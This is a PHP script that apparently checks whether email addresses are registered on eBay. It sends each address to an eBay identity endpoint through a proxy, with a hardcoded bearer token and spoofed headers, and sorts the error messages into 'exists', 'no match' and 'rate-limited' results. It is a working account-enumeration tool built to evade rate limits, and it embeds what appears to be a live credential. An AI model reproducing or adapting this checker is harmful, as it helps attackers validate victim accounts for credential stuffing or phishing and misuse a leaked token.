<?php
$email = "abc@gmail.com";
$proxy = "171.239.139.246:51134";
if (empty($email) || empty($proxy)) {
    die(json_encode(['status' => 'error']));
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://apisd.ebay.com/identity/v1/auth/user/init_auth_code');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json',
    'Host: apisd.ebay.com',
    'Accept-Language: en-US',
    'Authorization: Bearer v^1.1#i^1#p^1#r^1#I^3#f^0#t^Ul42XzU6NzQ4QjBEQzVBOTNFNjg5RUJENDI1OEU0OUM1OTYzNjRfMF8xI0VeMjYw',
    'X-EBAY-C-TERRITORY-ID: US',
    'X-EBAY-C-MARKETPLACE-ID: EBAY-US',
    'X-EBAY-C-CULTURAL-PREF: Currency=USD,Timezone=Asia/Ho_Chi_Minh,Units=US',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"sendCode":false,"subject":{"format":"USERNAME_OR_EMAIL","value":"' . $email . '"}}');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
$response = json_decode(curl_exec($ch), TRUE);

curl_close($ch);
print_r($response);
die('');
if ($response === false) {
    die(
        json_encode(
            array(
                'email' => $email,
                'status' => 429,
            )
        )
    );
}
if (isset($response['deliveryMessage'])) {

} else if ($response['errorMessage']['error'][0]['message'] == "We ran into a problem. Please sign in with your password instead.") {
    die(
        json_encode(
            array(
                'email' => $email,
                'status' => 200,
                'data' => null,
            )
        )
    );
} else if ($response['errorMessage']['error'][0]['message'] == "That's not a match. Please try again.") {
    die(
        json_encode(
            array(
                'email' => $email,
                'status' => 300,
                'data' => null,
            )
        )
    );
} else if ($response['errorMessage']['error'][0]['message'] == "User requests to view this page are subject to daily per user limits.") {
    die(
        json_encode(
            array(
                'email' => $email,
                'status' => 429,
                'data' => 'Block',
            )
        )
    );
} else {
    die(
        json_encode(
            array(
                'email' => $email,
                'status' => 500,
                'data' => 'API ERROR',
                'msg' => $response
            )
        )
    );
}
?>